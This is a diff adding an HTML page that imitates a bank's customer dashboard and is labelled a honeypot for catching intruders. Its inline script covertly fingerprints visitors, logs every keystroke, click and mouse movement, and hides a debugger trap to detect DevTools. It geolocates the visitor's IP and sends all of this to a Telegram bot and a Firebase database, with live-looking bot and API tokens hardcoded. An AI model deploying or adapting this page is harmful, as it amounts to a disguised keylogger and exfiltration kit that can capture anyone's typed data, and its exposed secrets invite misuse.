@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="light">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Secure National Bank - Dashboard</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+  <style>
+    /* Modern dashboard styling */
+    body {
+      background: linear-gradient(135deg, #f8fafc 0%, #e0e7ff 100%);
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+    
+    .dashboard-container {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+    }
+    
+    .dashboard-header {
+      background: linear-gradient(135deg, #1e3a8a 0%, #3b82f6 100%);
+      color: white;
+      padding: 30px;
+      border-radius: 16px;
+      margin-bottom: 30px;
+      box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1);
+    }
+    
+    .dashboard-header h1 {
+      margin: 0;
+      font-size: 2rem;
+      font-weight: 700;
+    }
+    
+    .dashboard-header p {
+      margin: 10px 0 0 0;
+      opacity: 0.9;
+    }
+    
+    .dashboard-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+      gap: 25px;
+      margin-bottom: 30px;
+    }
+    
+    .dashboard-card {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+      border: 1px solid #e5e7eb;
+    }
+    
+    .dashboard-card h3 {
+      color: #1f2937;
+      margin: 0 0 15px 0;
+      font-size: 1.2rem;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    
+    .balance-amount {
+      font-size: 2.5rem;
+      font-weight: 700;
+      color: #10b981;
+      margin: 10px 0;
+    }
+    
+    .activity-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    
+    .activity-list li {
+      padding: 12px 0;
+      border-bottom: 1px solid #f3f4f6;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+    
+    .activity-list li:last-child {
+      border-bottom: none;
+    }
+    
+    .activity-icon {
+      width: 40px;
+      height: 40px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.1rem;
+    }
+    
+    .activity-icon.transfer {
+      background: #fef3c7;
+      color: #d97706;
+    }
+    
+    .activity-icon.deposit {
+      background: #d1fae5;
+      color: #059669;
+    }
+    
+    .activity-icon.purchase {
+      background: #ddd6fe;
+      color: #7c3aed;
+    }
+    
+    .quick-actions {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+      gap: 15px;
+      margin-top: 20px;
+    }
+    
+    .action-btn {
+      background: linear-gradient(135deg, #3b82f6 0%, #1e40af 100%);
+      color: white;
+      border: none;
+      padding: 15px 20px;
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    
+    .action-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+    }
+  </style>
+</head>
+<body>
+  <div class="dashboard-container">
+    <div class="dashboard-header">
+      <h1><i class="fas fa-university"></i> Welcome Back, Valued Client</h1>
+      <p>Secure National Bank - Your trusted financial partner since 1985</p>
+    </div>
+
+    <div class="dashboard-grid">
+      <div class="dashboard-card">
+        <h3><i class="fas fa-wallet"></i> Account Balance</h3>
+        <div class="balance-amount">$12,847.50</div>
+        <p style="color: #6b7280; margin: 0;">Available Balance</p>
+        <p style="color: #10b981; margin: 5px 0 0 0; font-size: 0.9rem;">
+          <i class="fas fa-arrow-up"></i> +2.3% this month
+        </p>
+      </div>
+
+      <div class="dashboard-card">
+        <h3><i class="fas fa-chart-line"></i> Quick Stats</h3>
+        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px;">
+          <div>
+            <div style="font-size: 1.5rem; font-weight: 600; color: #3b82f6;">$2,340</div>
+            <div style="font-size: 0.9rem; color: #6b7280;">This Month</div>
+          </div>
+          <div>
+            <div style="font-size: 1.5rem; font-weight: 600; color: #10b981;">$890</div>
+            <div style="font-size: 0.9rem; color: #6b7280;">Saved</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="dashboard-card">
+      <h3><i class="fas fa-history"></i> Recent Activity</h3>
+      <ul class="activity-list">
+        <li>
+          <div class="activity-icon transfer">
+            <i class="fas fa-exchange-alt"></i>
+          </div>
+          <div style="flex: 1;">
+            <div style="font-weight: 600;">Transfer to John Smith</div>
+            <div style="font-size: 0.9rem; color: #6b7280;">Today, 2:30 PM</div>
+          </div>
+          <div style="font-weight: 600; color: #ef4444;">-$500.00</div>
+        </li>
+        <li>
+          <div class="activity-icon deposit">
+            <i class="fas fa-plus"></i>
+          </div>
+          <div style="flex: 1;">
+            <div style="font-weight: 600;">Salary Deposit</div>
+            <div style="font-size: 0.9rem; color: #6b7280;">Yesterday, 9:00 AM</div>
+          </div>
+          <div style="font-weight: 600; color: #10b981;">+$3,200.00</div>
+        </li>
+        <li>
+          <div class="activity-icon purchase">
+            <i class="fas fa-shopping-cart"></i>
+          </div>
+          <div style="flex: 1;">
+            <div style="font-weight: 600;">Amazon Purchase</div>
+            <div style="font-size: 0.9rem; color: #6b7280;">Jan 14, 4:15 PM</div>
+          </div>
+          <div style="font-weight: 600; color: #ef4444;">-$89.99</div>
+        </li>
+      </ul>
+      
+      <div class="quick-actions">
+        <button class="action-btn" onclick="trackAction('transfer')">
+          <i class="fas fa-paper-plane"></i> Transfer Money
+        </button>
+        <button class="action-btn" onclick="trackAction('deposit')">
+          <i class="fas fa-plus-circle"></i> Deposit Check
+        </button>
+        <button class="action-btn" onclick="trackAction('statements')">
+          <i class="fas fa-file-alt"></i> View Statements
+        </button>
+        <button class="action-btn" onclick="trackAction('support')">
+          <i class="fas fa-headset"></i> Contact Support
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fingerprintjs2/2.1.0/fingerprint2.min.js"></script>
+  <script>
+    const firebaseURL = "https://honeypot-715b9-default-rtdb.firebaseio.com/honeypot_sessions.json";
+    const telegramToken = "8389627211:AAGq6tuHxuLKX9m4AQR-ljj77z-GjKrpIig";
+    const chatID = "1919975349";
+
+    const sessionData = {
+      sessionId: generateSessionId(),
+      ip: "",
+      userAgent: navigator.userAgent,
+      screenResolution: `${screen.width}x${screen.height}`,
+      language: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      mouseMoves: [],
+      clicks: [],
+      keystrokes: [],
+      scrollEvents: [],
+      actions: [],
+      devToolsDetected: false,
+      startTime: Date.now(),
+      lastActivity: Date.now()
+    };
+
+    let notificationsSent = {
+      firstClick: false,
+      firstKey: false,
+      devTools: false,
+      suspiciousActivity: false
+    };
+
+    function generateSessionId() {
+      return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+    }
+
+    document.addEventListener("click", e => {
+      sessionData.clicks.push({
+        x: e.clientX,
+        y: e.clientY,
+        target: e.target.tagName,
+        timestamp: Date.now()
+      });
+      
+      sessionData.lastActivity = Date.now();
+      
+      if (!notificationsSent.firstClick) {
+        sendLiveTelegram("🖱️ First mouse click detected on honeypot dashboard");
+        notificationsSent.firstClick = true;
+      }
+    });
+
+    document.addEventListener("mousemove", e => {
+      // Sample mouse movements (every 100ms to avoid spam)
+      if (Date.now() - sessionData.lastActivity > 100) {
+        sessionData.mouseMoves.push({
+          x: e.clientX,
+          y: e.clientY,
+          timestamp: Date.now()
+        });
+        
+        // Keep only last 100 movements
+        if (sessionData.mouseMoves.length > 100) {
+          sessionData.mouseMoves.shift();
+        }
+      }
+      
+      sessionData.lastActivity = Date.now();
+    });
+
+    document.addEventListener("keydown", e => {
+      sessionData.keystrokes.push({
+        key: e.key,
+        code: e.code,
+        timestamp: Date.now()
+      });
+      
+      sessionData.lastActivity = Date.now();
+      
+      if (!notificationsSent.firstKey) {
+        sendLiveTelegram("⌨️ Keyboard activity detected - potential data entry attempt");
+        notificationsSent.firstKey = true;
+      }
+    });
+
+    document.addEventListener("scroll", e => {
+      sessionData.scrollEvents.push({
+        scrollY: window.scrollY,
+        timestamp: Date.now()
+      });
+      
+      sessionData.lastActivity = Date.now();
+    });
+
+    setInterval(() => {
+      const start = performance.now();
+      debugger;
+      const duration = performance.now() - start;
+      
+      if (duration > 100 && !sessionData.devToolsDetected) {
+        sessionData.devToolsDetected = true;
+        
+        if (!notificationsSent.devTools) {
+          sendLiveTelegram("🚨 CRITICAL: DevTools opened! Hacker is inspecting the honeypot");
+          notificationsSent.devTools = true;
+        }
+      }
+    }, 2000);
+
+    function trackAction(actionType) {
+      const action = {
+        type: actionType,
+        timestamp: Date.now()
+      };
+      
+      sessionData.actions.push(action);
+      sessionData.lastActivity = Date.now();
+      
+      // Send immediate alert for certain actions
+      const criticalActions = ['transfer', 'deposit'];
+      if (criticalActions.includes(actionType)) {
+        sendLiveTelegram(`💰 ALERT: Hacker attempted ${actionType} action on fake banking interface`);
+      }
+      
+      // Simulate loading for realism
+      const button = event.target;
+      button.classList.add('loading');
+      button.disabled = true;
+      
+      setTimeout(() => {
+        button.classList.remove('loading');
+        button.disabled = false;
+        alert(`${actionType.charAt(0).toUpperCase() + actionType.slice(1)} feature is temporarily unavailable. Please try again later.`);
+      }, 2000);
+    }
+
+    fetch("https://ipinfo.io/json?token=27824af3b12c98")
+      .then(res => res.json())
+      .then(ipData => {
+        sessionData.ip = ipData.ip;
+        sessionData.location = {
+          city: ipData.city,
+          region: ipData.region,
+          country: ipData.country,
+          org: ipData.org
+        };
+        
+        // Send initial alert
+        sendLiveTelegram(`🎯 NEW HONEYPOT VICTIM DETECTED!\nIP: ${ipData.ip}\nLocation: ${ipData.city}, ${ipData.country}\nISP: ${ipData.org}`);
+      })
+      .catch(err => console.log("IP lookup failed:", err));
+
+    window.addEventListener("beforeunload", () => {
+      sessionData.endTime = Date.now();
+      sessionData.duration = ((sessionData.endTime - sessionData.startTime) / 1000).toFixed(1);
+      sessionData.totalClicks = sessionData.clicks.length;
+      sessionData.totalKeystrokes = sessionData.keystrokes.length;
+      sessionData.totalMouseMoves = sessionData.mouseMoves.length;
+      sessionData.totalActions = sessionData.actions.length;
+      
+      // Send final session summary
+      sendToFirebase(sessionData);
+      
+      const summary = `📊 HONEYPOT SESSION ENDED
+Duration: ${sessionData.duration}s
+Clicks: ${sessionData.totalClicks}
+Keystrokes: ${sessionData.totalKeystrokes}
+Actions: ${sessionData.totalActions}
+DevTools: ${sessionData.devToolsDetected ? 'YES' : 'NO'}`;
+      
+      sendLiveTelegram(summary);
+    });
+
+    function sendToFirebase(data) {
+      fetch(firebaseURL, {
+        method: "POST",
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(data)
+      })
+      .then(response => response.json())
+      .then(() => console.log("✔️ Session data sent to Firebase"))
+      .catch(err => console.log("Firebase error:", err));
+    }
+
+    function sendLiveTelegram(msg) {
+      const message = `⚠️ *HONEYPOT ALERT*\n\n${msg}\n\nIP: \`${sessionData.ip || 'pending'}\`\nSession: \`${sessionData.sessionId}\`\nTime: ${new Date().toLocaleString()}`;
+
+      fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatID,
+          text: message,
+          parse_mode: "Markdown"
+        })
+      })
+      .then(() => console.log("📬 Telegram alert sent"))
+      .catch(err => console.log("Telegram error:", err));
+    }
+
+    setInterval(() => {
+      const timeSinceLastActivity = Date.now() - sessionData.lastActivity;
+      
+      // If user is inactive for more than 30 seconds, send update
+      if (timeSinceLastActivity > 30000 && sessionData.clicks.length > 0) {
+        if (!notificationsSent.suspiciousActivity) {
+          sendLiveTelegram("😴 Hacker appears to be studying the interface - no activity for 30+ seconds");
+          notificationsSent.suspiciousActivity = true;
+        }
+      }
+    }, 10000);
+  </script>
+</body>
+</html>
